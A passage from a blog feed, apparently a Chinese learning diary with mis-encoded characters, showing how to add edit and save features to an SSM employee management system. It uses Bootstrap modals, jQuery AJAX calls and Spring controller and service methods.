class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--å‘˜å·¥ä¿®æ”¹çš„æ¨¡æ€æ¡†--%&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal fade"</span> id=<span class="string">"empUpdateModal"</span> tabindex=<span class="string">"-1"</span> role=<span class="string">"dialog"</span> aria-labelledby=<span class="string">"myModalLabel"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-dialog"</span> role=<span class="string">"document"</span>&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-content"</span>&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-header"</span>&gt;</span><br><span class="line">                &lt;button <span class="class"><span class="keyword">type</span></span>=<span class="string">"button"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"close"</span> data-dismiss=<span class="string">"modal"</span> aria-label=<span class="string">"Close"</span>&gt;&lt;span aria-hidden=<span class="string">"true"</span>&gt;&amp;times;&lt;/span&gt;&lt;/button&gt;</span><br><span class="line">                &lt;h4 <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-title"</span>&gt;å‘˜å·¥ä¿®æ”¹&lt;/h4&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-body"</span>&gt;</span><br><span class="line">                &lt;form <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-horizontal"</span>&gt;</span><br><span class="line">                    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">                        &lt;label <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-2 control-label"</span>&gt;empName&lt;/label&gt;</span><br><span class="line">                        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-10"</span>&gt;</span><br><span class="line">                            &lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"text"</span> name=<span class="string">"empName"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control"</span> id=<span class="string">"empName_update_input"</span> placeholder=<span class="string">"empName"</span>&gt;</span><br><span class="line">                            &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"help-block"</span>&gt;&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">                        &lt;label <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-2 control-label"</span>&gt;email&lt;/label&gt;</span><br><span class="line">                        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-10"</span>&gt;</span><br><span class="line">                            &lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"text"</span> name=<span class="string">"email"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control"</span> id=<span class="string">"email_update_input"</span> placeholder=<span class="string">"email@qq.com"</span>&gt;</span><br><span class="line">                            &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"help-block"</span>&gt;&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">                        &lt;label <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-2 control-label"</span>&gt;gender&lt;/label&gt;</span><br><span class="line">                        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-10"</span>&gt;</span><br><span class="line">                            &lt;label <span class="class"><span class="keyword">class</span></span>=<span class="string">"radio-inline"</span>&gt;</span><br><span class="line">                                &lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"radio"</span> name=<span class="string">"gender"</span> id=<span class="string">"gender1_update_input"</span> value=<span class="string">"M"</span> checked=<span class="string">"checked"</span>&gt; ç”·</span><br><span class="line">                            &lt;/label&gt;</span><br><span class="line">                            &lt;label <span class="class"><span class="keyword">class</span></span>=<span class="string">"radio-inline"</span>&gt;</span><br><span class="line">                                &lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"radio"</span> name=<span class="string">"gender"</span> id=<span class="string">"gender2_update_input"</span> value=<span class="string">"F"</span>&gt; å¥³</span><br><span class="line">                            &lt;/label&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">                        &lt;label <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-2 control-label"</span>&gt;deptName&lt;/label&gt;</span><br><span class="line">                        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-4"</span>&gt;</span><br><span class="line">                            &lt;%--                            éƒ¨é—¨æäº¤éƒ¨é—¨idå³å¯--%&gt;</span><br><span class="line">                            &lt;select <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control"</span> name=<span class="string">"dId"</span>&gt;</span><br><span class="line">                                &lt;%--  éƒ¨é—¨åç§°--%&gt;</span><br><span class="line">                            &lt;/select&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-footer"</span>&gt;</span><br><span class="line">                &lt;button <span class="class"><span class="keyword">type</span></span>=<span class="string">"button"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-default"</span> data-dismiss=<span class="string">"modal"</span>&gt;å…³é—­&lt;/button&gt;</span><br><span class="line">                &lt;button <span class="class"><span class="keyword">type</span></span>=<span class="string">"button"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-primary"</span> id=<span class="string">"emp_update_btn"</span>&gt;æ›´æ–°&lt;/button&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åç»™æŒ‰é’®åŠ ä¸Šæ ‡è¯†<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var editBtn = <span class="constructor">$(<span class="string">"&lt;button&gt;&lt;/button&gt;"</span>)</span>.add<span class="constructor">Class(<span class="string">"btn btn-primary btn-sm edit_btn"</span>)</span></span><br><span class="line">    .append(<span class="constructor">$(<span class="string">"&lt;span&gt;&lt;/span&gt;"</span>)</span>.add<span class="constructor">Class(<span class="string">"glyphicon glyphicon-pencil"</span>)</span>).append(<span class="string">"ç¼–è¾‘"</span>);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &lt;button class="btn btn-danger btn-sm"&gt;</span></span><br><span class="line"><span class="comment"> &lt;span class="glyphicon glyphicon-trash" aria-hidden="true" /&gt;&lt;/span&gt;</span></span><br><span class="line"><span class="comment"> åˆ é™¤</span></span><br><span class="line"><span class="comment"> &lt;/button&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">var delBtn = <span class="constructor">$(<span class="string">"&lt;button&gt;&lt;/button&gt;"</span>)</span>.add<span class="constructor">Class(<span class="string">"btn btn-danger btn-sm delete_btn"</span>)</span></span><br><span class="line">    .append(<span class="constructor">$(<span class="string">"&lt;span&gt;&lt;/span&gt;"</span>)</span>.add<span class="constructor">Class(<span class="string">"glyphicon glyphicon-trash"</span>)</span>).append(<span class="string">"åˆ é™¤"</span>);</span><br></pre></td></tr></table></figure><br>åˆ«å¿˜äº†è¿˜æœ‰ç»‘å®šç‚¹å‡»äº‹ä»¶<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.æŒ‰é’®åˆ›å»ºä¹‹å‰å°±ç»‘å®šäº†clickï¼Œæ‰€ä»¥ç»‘å®šä¸ä¸Š</span></span><br><span class="line"><span class="comment">//1).å¯ä»¥åœ¨åˆ›å»ºæŒ‰é’®çš„æ—¶å€™ç»‘å®šäº‹ä»¶ 2).live()</span></span><br><span class="line"><span class="comment">//jqueryæ–°ç‰ˆæ²¡æœ‰liveï¼Œä½¿ç”¨onæ–¹æ³•è¿›è¡Œæ›¿ä»£</span></span><br><span class="line">$(<span class="built_in">document</span>).on(<span class="string">"click"</span>,<span class="string">".edit_btn"</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//alert("edit")</span></span><br><span class="line">    <span class="comment">//0.æŸ¥å‡ºå‘˜å·¥ä¿¡æ¯ï¼Œæ˜¾ç¤ºå‘˜å·¥ä¿¡æ¯</span></span><br><span class="line">    <span class="comment">//1.æŸ¥å‡ºéƒ¨é—¨ä¿¡æ¯ï¼Œå¹¶æ˜¾ç¤ºéƒ¨é—¨åˆ—è¡¨</span></span><br><span class="line"></span><br><span class="line">    getDepts(<span class="string">"#empUpdateModal select"</span>)</span><br><span class="line">    $(<span class="string">"#empUpdateModal"</span>).modal(&#123;</span><br><span class="line">        backdrop:<span class="string">"static"</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>ç°åœ¨çš„æ¨¡æ€æ¡†å’Œæ·»åŠ çš„æ¨¡æ€æ¡†æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦åšä¸€äº›ä¿®æ”¹</p><h2 id="æ˜¾ç¤ºä¿¡æ¯"><a href="#æ˜¾ç¤ºä¿¡æ¯" class="headerlink" title="æ˜¾ç¤ºä¿¡æ¯"></a>æ˜¾ç¤ºä¿¡æ¯</h2><p>æ•ˆæœå›¾ä¸­ï¼Œç”¨æˆ·åæ˜¯ä¸èƒ½å˜å¾—ï¼Œæ‰€ä»¥ä»<a href="https://v3.bootcss.com/css/" target="_blank" rel="noopener">bootstrapå…¨å±€æ ·å¼</a>ä¸­æ‰¾åˆ°è¡¨å•çš„é™æ€æ§ä»¶<br>å®é™…ä¸Šå°±åŠ äº†ä¸€ä¸ªpæ ‡ç­¾<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control-static"</span>&gt;email<span class="meta">@example</span>.com&lt;/p&gt;</span><br></pre></td></tr></table></figure></p><p>æƒ³è¦æ›´æ–°æ—¶ä¿æŒä¸å˜å¹¶ä¸å…¶å¯¹åº”ï¼Œé‚£è¿˜æ˜¯å‘é€ajaxè¯·æ±‚ï¼Œä¼ åˆ°è¿™ä¸ªé™æ€æ§ä»¶ä¸­<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control-static"</span> id=<span class="string">"empName_update_static"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>åœ¨EmployeeControllerä¸­æ·»åŠ <br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æŒ‰ç…§å‘˜å·¥idæŸ¥è¯¢å‘˜å·¥</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequestMapping(value=<span class="meta-string">"/emp/&#123;id&#125;"</span>,method=RequestMethod.GET)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> Msg getEmp(<span class="meta">@PathVariable(<span class="meta-string">"id"</span>)</span> Integer id)&#123;</span><br><span class="line">    Employee employee = employeeService.getEmp(id);</span><br><span class="line">    <span class="keyword">return</span> Msg.success().add(<span class="string">"emp"</span>,employee);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¯¹åº”çš„Serviceä¸­ä¹Ÿæ·»åŠ ä¸Š<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">public</span> Employee getEmp(Integer id) &#123;</span><br><span class="line">    <span class="attribute">Employee</span> employee = employeeMapper.<span class="literal">select</span>ByPrimaryKey(id);</span><br><span class="line">    <span class="attribute">return</span> employee;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ç»™ç¼–è¾‘æŒ‰é’®æ·»åŠ ä¸€ä¸ªè‡ªå®šä¹‰å±æ€§<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var editBtn = <span class="constructor">$(<span class="string">"&lt;button&gt;&lt;/button&gt;"</span>)</span>.add<span class="constructor">Class(<span class="string">"btn btn-primary btn-sm edit_btn"</span>)</span></span><br><span class="line">    .append(<span class="constructor">$(<span class="string">"&lt;span&gt;&lt;/span&gt;"</span>)</span>.add<span class="constructor">Class(<span class="string">"glyphicon glyphicon-pencil"</span>)</span>).append(<span class="string">"ç¼–è¾‘"</span>);</span><br><span class="line"><span class="comment">//ä¸ºç¼–è¾‘æŒ‰é’®æ·»åŠ ä¸€ä¸ªè‡ªå®šä¹‰çš„å±æ€§ï¼Œæ¥è¡¨ç¤ºå½“å‰å‘˜å·¥id</span></span><br><span class="line">editBtn.attr(<span class="string">"edit-id"</span>,item.empId);</span><br></pre></td></tr></table></figure></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.æŒ‰é’®åˆ›å»ºä¹‹å‰å°±ç»‘å®šäº†clickï¼Œæ‰€ä»¥ç»‘å®šä¸ä¸Š</span></span><br><span class="line"><span class="comment">//1).å¯ä»¥åœ¨åˆ›å»ºæŒ‰é’®çš„æ—¶å€™ç»‘å®šäº‹ä»¶ 2).live()</span></span><br><span class="line"><span class="comment">//jqueryæ–°ç‰ˆæ²¡æœ‰liveï¼Œä½¿ç”¨onæ–¹æ³•è¿›è¡Œæ›¿ä»£</span></span><br><span class="line">$(<span class="built_in">document</span>).on(<span class="string">"click"</span>,<span class="string">".edit_btn"</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//alert("edit")</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.æŸ¥å‡ºéƒ¨é—¨ä¿¡æ¯ï¼Œå¹¶æ˜¾ç¤ºéƒ¨é—¨åˆ—è¡¨</span></span><br><span class="line">    getDepts(<span class="string">"#empUpdateModal select"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.æŸ¥å‡ºå‘˜å·¥ä¿¡æ¯ï¼Œæ˜¾ç¤ºå‘˜å·¥ä¿¡æ¯</span></span><br><span class="line">    getEmp($(<span class="keyword">this</span>).attr(<span class="string">"edit-id"</span>));</span><br><span class="line">    $(<span class="string">"#empUpdateModal"</span>).modal(&#123;</span><br><span class="line">        backdrop:<span class="string">"static"</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getEmp</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"$&#123;APP_PATH&#125;/emp/"</span>+id,</span><br><span class="line">        type:<span class="string">"GET"</span>,</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// console.log(result);</span></span><br><span class="line">            <span class="keyword">var</span> empData = result.extend.emp;</span><br><span class="line">            $(<span class="string">"#empName_update_static"</span>).text(empData.empName);</span><br><span class="line">            $(<span class="string">"#email_update_input"</span>).val(empData.email);</span><br><span class="line">            $(<span class="string">"#empUpdateModal input[name=gender]"</span>).val([empData.gender]);</span><br><span class="line">            $(<span class="string">"#empUpdateModal select"</span>).val([empData.dId]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒåŸºæœ¬çš„æ˜¾ç¤ºå°±å®Œæˆäº†</p><h2 id="æ›´æ–°ä¿¡æ¯"><a href="#æ›´æ–°ä¿¡æ¯" class="headerlink" title="æ›´æ–°ä¿¡æ¯"></a>æ›´æ–°ä¿¡æ¯</h2><p>åœ¨EmployeeControllerä¸­æ·»åŠ ä¸Š<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å‘˜å·¥æ›´æ–°æ–¹æ³•</span></span><br><span class="line"><span class="comment"> * @param employee</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">@ResponseBody</span></span><br><span class="line"><span class="variable">@RequestMapping</span>(value = <span class="string">"/emp/&#123;empId&#125;"</span>,method = RequestMethod.PUT)</span><br><span class="line">public Msg saveEmp(Employee employee)&#123;</span><br><span class="line">    <span class="selector-tag">employeeService</span><span class="selector-class">.updateEmp</span>(employee);</span><br><span class="line">    <span class="selector-tag">return</span> <span class="selector-tag">Msg</span><span class="selector-class">.success</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>Serviceä¸­ä¹Ÿå¯¹åº”æ·»åŠ <br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å‘˜å·¥æ›´æ–°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> employee</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">updateEmp</span><span class="params">(Employee employee)</span></span>&#123;</span><br><span class="line">    employeeMapper.updateByPrimaryKeySelective(employee);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>åœ¨index.jspä¸­æ·»åŠ ä¸Šç‚¹å‡»äº‹ä»¶<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç‚¹å‡»æ›´æ–°ï¼Œæ›´æ–°å‘˜å·¥ä¿¡æ¯</span></span><br><span class="line">$(<span class="string">"#emp_update_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//1.éªŒè¯é‚®ç®±æ˜¯å¦åˆæ³•</span></span><br><span class="line">    <span class="keyword">var</span> email = $(<span class="string">"#email_update_input"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> regEmaill = <span class="regexp">/^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!regEmaill.test(email))&#123;</span><br><span class="line">        <span class="comment">// alert("é‚®ç®±æ ¼å¼ä¸æ­£ç¡®");</span></span><br><span class="line">        show_validate_msg(<span class="string">"#email_update_input"</span>,<span class="string">"error"</span>,<span class="string">"é‚®ç®±æ ¼å¼ä¸æ­£ç¡®"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        show_validate_msg(<span class="string">"#email_update_input"</span>,<span class="string">"success"</span>,<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//2.å‘é€ajaxè¯·æ±‚ï¼Œä¿å­˜æ›´æ–°çš„å‘˜å·¥æ•°æ®</span></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"$&#123;APP_PATH&#125;/emp/"</span>+$(<span class="keyword">this</span>).attr(<span class="string">"edit-id"</span>),</span><br><span class="line">        type:<span class="string">"POST"</span>,</span><br><span class="line">        data:$(<span class="string">"#empUpdateModal form"</span>).serialize()+<span class="string">"&amp;_method=PUT"</span>,</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            alert(result.msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>è¿™æ ·å°±å®Œæˆäº†æ›´æ–°çš„åŸºæœ¬æ“ä½œ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ä¿å­˜&quot;&gt;&lt;a href=&quot;#ä¿å­˜&quot; class=&quot;headerlink&quot; title=&quot;ä¿å­˜&quot;&gt;&lt;/a&gt;ä¿å­˜&lt;/h1&gt;&lt;h2 id=&quot;æ ¡éªŒ&quot;&gt;&lt;a href=&quot;#æ ¡éªŒ&quot; class=&quot;headerlink&quot; title=&quot;æ ¡éªŒ&quot;&gt;&lt;/a&gt;æ ¡éªŒ&lt;/h2&gt;&lt;p&gt;ä¹‹å‰å®Œ
      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>SSM-2020/10/16-å‘˜å·¥ç®¡ç†ç³»ç»Ÿ-3</title>
    <link href="http://yoursite.com/2020/10/16/SSM-2020-10-16-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/10/16/SSM-2020-10-16-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-10-16T11:16:41.000Z</published>
    <updated>2021-02-21T04:57:56.388Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¿å­˜"><a href="#ä¿å­˜" class="headerlink" title="ä¿å­˜"></a>ä¿å­˜</h1><p>URIï¼š</p><ul><li><p>/emp/{id}   GET æŸ¥è¯¢å‘˜å·¥</p></li><li><p>/emp    POSTä¿å­˜å‘˜å·¥</p></li><li><p>/emp/{id}   PUTä¿®æ”¹å‘˜å·¥</p></li><li><p>/emp/{id}   DELETEåˆ é™¤å‘˜å·¥</p></li></ul><p>é¦–å…ˆæ·»åŠ ä¸€ä¸ªç‚¹å‡»äº‹ä»¶ï¼Œç‚¹å‡»ä¿å­˜çš„æ—¶å€™ï¼Œå®Œæˆä¿å­˜äº‹ä»¶<br><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#emp_save_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//1.æ¨¡æ€æ¡†ä¸­å¡«å†™çš„è¡¨å•æ•°æ®æäº¤ç»™æœåŠ¡å™¨è¿›è¡Œä¿å­˜</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>ç»™ä¿å­˜æŒ‰é’®æ·»åŠ ä¸Š<code>id=emp_save_btn</code></p><p>æ¥ç€åœ¨EmployeeControllerä¸­æ·»åŠ æ–¹æ³•<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@RequestMapping</span>(value = <span class="string">"/emp"</span>,method = RequestMethod.POST)</span><br><span class="line"><span class="variable">@ResponseBody</span></span><br><span class="line">public Msg saveEmp(Employee employee)&#123;</span><br><span class="line">    <span class="selector-tag">employeeService</span><span class="selector-class">.saveEmp</span>(employee);</span><br><span class="line">    <span class="selector-tag">return</span> <span class="selector-tag">Msg</span><span class="selector-class">.success</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>EmployeeServiceä¸­å¯¹åº”çš„å†™æ–¹æ³•</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å‘˜å·¥ä¿å­˜æ–¹æ³•</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public void save<span class="constructor">Emp(Employee <span class="params">employee</span>)</span>&#123;</span><br><span class="line">    employeeMapper.insert<span class="constructor">Selective(<span class="params">employee</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€å®Œå–„ç‚¹å‡»äº‹ä»¶</p><p>ç”±äºéœ€è¦ajaxè¯·æ±‚ä¿å­˜å‘˜å·¥ï¼Œä½†æ˜¯ä¸€ä¸ªä¸€ä¸ªå–å‡ºå‘˜å·¥æ•°æ®å¤ªè¿‡äºéº»çƒ¦ï¼Œæ‰€ä»¥å°±éœ€è¦è¯·å‡ºä¸€ç”Ÿå™©æ¢¦ï¼Œåºåˆ—åŒ–ä¸ååºåˆ—åŒ–</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//alert($("#empAddModal form").serialize());</span></span><br><span class="line"></span><br><span class="line">$.ajax(&#123;</span><br><span class="line"><span class="symbol">    url:</span><span class="string">"$&#123;APP_PATH&#125;/emp"</span>,</span><br><span class="line"><span class="symbol">    type:</span><span class="string">"POST"</span>,</span><br><span class="line"><span class="symbol">    data:</span>$(<span class="string">"#empAddModal form"</span>).serialize()</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜æƒ³è¦å†ç‚¹å‡»ä¿å­˜ä¹‹åå…³é—­æ¨¡æ€æ¡†å¹¶ä¸”è½¬åˆ°æœ€åä¸€é¡µæ¥æ˜¾ç¤ºåˆšæ‰çš„æ•°æ®</p><p>è®¿é—®ä¸€ä¸‹<a 